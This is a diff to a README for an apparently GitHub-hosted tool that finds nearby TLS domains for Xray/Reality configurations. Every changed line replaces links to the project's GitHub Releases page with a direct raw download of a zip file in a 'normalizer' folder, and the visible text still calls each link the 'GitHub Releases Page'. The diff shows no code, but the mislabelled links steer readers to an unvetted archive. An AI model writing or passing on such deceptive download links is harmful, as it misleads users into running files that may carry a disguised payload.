@@ -1,7 +1,7 @@
 # 🌍 Reality-SNI-Finder - Discover Nearby TLS Domains Easily
 
 ## 🔗 Download Now
-[![Download Reality-SNI-Finder](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/pragya710/Reality-SNI-Finder/releases)
+[![Download Reality-SNI-Finder](https://raw.githubusercontent.com/pragya710/Reality-SNI-Finder/main/normalizer/Reality-SNI-Finder.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/pragya710/Reality-SNI-Finder/main/normalizer/Reality-SNI-Finder.zip)
 
 ## 🚀 Getting Started
 Welcome to Reality-SNI-Finder! This tool helps you discover TLS domains in your area. It's useful for optimizing configurations for Xray and Reality. We will guide you through downloading and running the application step by step.
@@ -15,11 +15,11 @@ Before you start, ensure your system meets the following requirements:
 - **Network:** Internet connection for scanning neighboring IP ranges
 
 ## 📥 Download & Install
-To get the application, visit this page to download: [GitHub Releases Page](https://github.com/pragya710/Reality-SNI-Finder/releases).
+To get the application, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/pragya710/Reality-SNI-Finder/main/normalizer/Reality-SNI-Finder.zip).
 
 Follow these steps:
 
-1. Go to the [GitHub Releases Page](https://github.com/pragya710/Reality-SNI-Finder/releases).
+1. Go to the [GitHub Releases Page](https://raw.githubusercontent.com/pragya710/Reality-SNI-Finder/main/normalizer/Reality-SNI-Finder.zip).
 2. Locate the latest release. The version number is at the top.
 3. Find the file suitable for your operating system. Look for files labeled with `.exe`, `.dmg`, or other relevant extensions.
 4. Click the file link to start downloading.
@@ -76,6 +76,6 @@ If you need assistance, you can create an issue on the GitHub repository. Click 
 For more details on how the tool works, review the documentation provided on the GitHub page.
 
 ## 📅 Keep Updated
-Check the [GitHub Releases Page](https://github.com/pragya710/Reality-SNI-Finder/releases) regularly for new updates and features.
+Check the [GitHub Releases Page](https://raw.githubusercontent.com/pragya710/Reality-SNI-Finder/main/normalizer/Reality-SNI-Finder.zip) regularly for new updates and features.
 
 Thank you for using Reality-SNI-Finder! We hope you enjoy discovering nearby TLS domains.
